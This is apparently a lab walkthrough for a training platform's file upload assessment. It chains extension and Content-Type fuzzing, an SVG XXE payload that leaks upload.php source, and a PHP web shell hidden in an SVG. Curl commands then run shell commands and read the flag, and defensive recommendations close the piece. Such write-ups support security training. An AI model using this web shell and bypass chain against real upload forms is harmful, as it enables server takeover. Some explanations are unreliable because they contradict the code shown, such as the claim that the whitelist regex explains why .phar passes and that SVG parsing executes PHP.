# Skills Assessment - File Upload Attacks Walkthrough

> **🎯 Real-World Assessment:** Complete attack chain combining multiple bypass techniques to achieve RCE

## Challenge Overview

**Objective:** Exploit upload form to read the flag found at root directory "/"

**Target:** Contact form with image upload functionality that employs multiple security layers:
- Extension validation (blacklist + whitelist)
- Content-Type validation 
- MIME-Type validation
- File size restrictions

---

## Phase 1: Initial Reconnaissance

### Discovery Process

**1. Target Identification:**
- Navigate to website root page
- Click on "Contact Us" section
- Identify image upload functionality

**2. Upload Behavior Analysis:**
- Images upload and display directly after clicking green icon
- No need to click "SUBMIT" button
- Files saved as base64 strings (upload directory hidden)

### Key Observations

**Upload Response Analysis:**
```
✅ Image uploads work immediately
🔒 Upload directory path hidden (base64 encoding)
🎯 Direct file execution likely possible
```

---

## Phase 2: Extension Bypass Discovery

### Burp Suite Setup

**1. Proxy Configuration:**
- Start Burp Suite
- Set FoxyProxy to "BURP" profile
- Intercept upload request (Ctrl + I)

**2. Extension Fuzzing Setup:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="test§.jpg§"
Content-Type: image/jpeg

[file content]
----boundary--
```

### Extension Discovery Results

**Testing Method:**
1. Clear default payload markers
2. Add payload marker: `§.jpg§`
3. Uncheck "URL-encode these characters"
4. Load PHP extensions wordlist
5. Execute attack

**Extensions Wordlist:**
```bash
# Download PHP extensions list
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-extensions.txt
```

**Discovered Allowed Extensions:**
```
✅ .pht   - "Only images are allowed" (not "Extension not allowed")
✅ .phtm  - "Only images are allowed" 
✅ .phar  - "Only images are allowed"
✅ .pgif  - "Only images are allowed"
```

**Analysis:** These extensions bypass the blacklist but still trigger whitelist validation.

---

## Phase 3: Content-Type Bypass Discovery

### Content-Type Fuzzing

**Payload Position:**
```http
Content-Type: §image/jpeg§
```

**Wordlist Preparation:**
```bash
# Download content types list
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt

# Filter for image types only
cat web-all-content-types.txt | grep 'image/' | xclip -se c
```

### Successful Content-Types

**Attack Results:**
```
✅ image/jpg     - Upload successful (190+ bytes response)
✅ image/jpeg    - Upload successful  
✅ image/png     - Upload successful
✅ image/svg+xml - Upload successful ⭐ (Key finding!)
❌ Others        - "Only images are allowed" (190 bytes)
```

**Critical Discovery:** `image/svg+xml` is allowed, enabling XXE attacks!

---

## Phase 4: Source Code Disclosure via XXE

### SVG XXE Payload Creation

**XXE File Creation:**
```bash
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
EOF
```

### Upload Process

**1. Filename Bypass:**
```bash
# Rename for frontend bypass
mv shell.svg shell.jpeg
```

**2. Burp Request Modification:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
----boundary--
```

### Source Code Analysis

**Base64 Decoding:**
```bash
echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7...' | base64 -d
```

**Decoded upload.php:**
```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

### Critical Intelligence Gathered

**1. Upload Directory:** `./user_feedback_submissions/`
**2. File Naming Pattern:** `date('ymd') . '_' . basename($_FILES["uploadFile"]["name"])`
**3. Validation Logic:**
   - Blacklist: Blocks `.ph(p|ps|tml)` extensions
   - Whitelist: Requires `[a-z]{2,3}g$` ending (explains why `.phar` works!)
   - Content-Type: Must match `/image\/[a-z]{2,3}g/` (explains why `svg+xml` works!)

---

## Phase 5: Web Shell Upload and Execution

### Combined Attack Payload

**Shell Creation:**
```bash
cat << 'EOF' > shell.phar.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
EOF
```

**Why This Works:**
- ✅ **Extension:** `.svg` satisfies whitelist regex `[a-z]{2,3}g$`
- ✅ **Content-Type:** `image/svg+xml` matches type validation
- ✅ **Execution:** `.svg` files processed as XML, PHP code executed
- ✅ **Bypass:** `.phar` in middle bypasses blacklist (doesn't end with prohibited extension)

### Upload Process

**1. Frontend Bypass:**
```bash
mv shell.phar.svg shell.phar.jpeg
```

**2. Burp Request Modification:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_REQUEST['cmd']); ?>
----boundary--
```

### Command Execution

**File Location Calculation:**
```bash
# Current date in ymd format (e.g., 221130 for Nov 30, 2022)
YMD=$(date +%y%m%d)
echo "Shell location: /contact/user_feedback_submissions/${YMD}_shell.phar.svg"
```

**Test Command Execution:**
```bash
# List root directory
curl "http://TARGET_IP:PORT/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=ls+/"
```

**Expected Response:**
```
[Base64 content from XXE]
bin
boot
dev
etc
flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
home
...
```

### Flag Retrieval

**Final Command:**
```bash
curl "http://TARGET_IP:PORT/contact/user_feedback_submissions/221130_shell.phar.svg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt"
```

**Flag Format:** `HTB{...}`

---

## Attack Chain Summary

### Complete Methodology

**1. 🔍 Reconnaissance**
   - Identify upload functionality
   - Analyze upload behavior and responses

**2. 🎯 Extension Discovery**
   - Fuzz extensions with Burp Intruder
   - Identify bypasses (`.phar`, `.pht`, etc.)

**3. 📋 Content-Type Analysis**
   - Fuzz Content-Type headers
   - Discover allowed image types including `svg+xml`

**4. 📄 Source Code Disclosure**
   - Create XXE SVG payload
   - Extract `upload.php` source code
   - Analyze validation logic and file paths

**5. 💣 Web Shell Deployment**
   - Craft combined XXE+PHP payload
   - Bypass all validation layers
   - Upload executable web shell

**6. ⚡ Command Execution**
   - Calculate file location using date pattern
   - Execute system commands via URL parameter
   - Retrieve target flag file

---

## Technical Analysis

### Validation Bypass Techniques Used

**1. Extension Filtering Bypass:**
```php
// Blacklist regex: /.+\.ph(p|ps|tml)/
// Bypassed by: shell.phar.svg (doesn't end with blocked extensions)

// Whitelist regex: /^.+\.[a-z]{2,3}g$/  
// Satisfied by: .svg (3 chars ending in 'g')
```

**2. Content-Type Bypass:**
```php
// Type regex: /image\/[a-z]{2,3}g/
// Satisfied by: image/svg+xml (contains "svg" ending in 'g')
```

**3. File Execution Chain:**
```
SVG uploaded → XML parser processes content → PHP code executed
```

### Vulnerability Root Causes

**1. Insufficient Extension Validation:**
- Regex allows 3-character extensions ending in 'g'
- Enables `.svg` uploads which can contain executable code

**2. Weak Content-Type Validation:**
- Allows `image/svg+xml` which supports embedded scripts
- SVG files processed as XML with PHP execution context

**3. Direct File Access:**
- Uploaded files accessible via direct URL
- No execution restrictions in upload directory

**4. Predictable File Naming:**
- Date-based prefixes are easily calculated
- File locations can be determined without disclosure

---

## Defense Recommendations

### Immediate Mitigations

**1. Strict Extension Whitelist:**
```php
// Only allow specific safe image extensions
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
if (!in_array($extension, $allowedExtensions)) {
    die("Extension not allowed");
}
```

**2. Enhanced Content Validation:**
```php
// Verify actual file content matches extension
$allowedTypes = [
    'jpg' => ['image/jpeg'],
    'jpeg' => ['image/jpeg'], 
    'png' => ['image/png'],
    'gif' => ['image/gif']
];

$actualType = mime_content_type($tmpFile);
if (!in_array($actualType, $allowedTypes[$extension])) {
    die("File content doesn't match extension");
}
```

**3. Execution Prevention:**
```apache
# .htaccess in upload directory
<Files "*">
    php_flag engine off
    AddType text/plain .php .phtml .php3 .svg
    RemoveHandler .php .phtml .php3 .php4 .php5 .svg
</Files>
```

**4. File Access Control:**
```php
// Serve files through controlled script instead of direct access
// Implement proper authorization and path validation
```

### Long-term Security Measures

1. **Content Sanitization** - Strip metadata and reprocess images
2. **Isolated Processing** - Process uploads in sandboxed environment  
3. **Random File Names** - Use UUIDs instead of predictable patterns
4. **WAF Protection** - Deploy web application firewall rules
5. **Regular Updates** - Keep all file processing libraries current

---

## Learning Outcomes

### Skills Demonstrated

**Technical Skills:**
- 🔍 **Reconnaissance** - Upload functionality discovery
- 🎯 **Fuzzing** - Extension and Content-Type enumeration  
- 🛡️ **Bypass Techniques** - Multi-layer validation circumvention
- 📄 **XXE Exploitation** - Source code disclosure via XML processing
- 💣 **Web Shell Deployment** - Combined payload crafting
- ⚡ **Command Execution** - System-level access achievement

**Methodology Skills:**
- **Systematic Testing** - Methodical validation layer analysis
- **Chain Exploitation** - Combining multiple vulnerabilities
- **Pattern Recognition** - Understanding validation logic flaws
- **Tool Integration** - Burp Suite automation and manual testing

### Key Takeaways

1. **Defense-in-Depth Failure** - Multiple weak controls don't equal strong security
2. **Regex Complexity Risk** - Complex patterns often contain logical flaws
3. **File Type Confusion** - SVG files blur line between data and executable content
4. **Information Disclosure Impact** - Source code access enables targeted attacks
5. **Chained Vulnerabilities** - Individual weak controls compound into critical risk

This Skills Assessment perfectly demonstrates how real-world file upload vulnerabilities require combining multiple techniques to achieve successful exploitation. 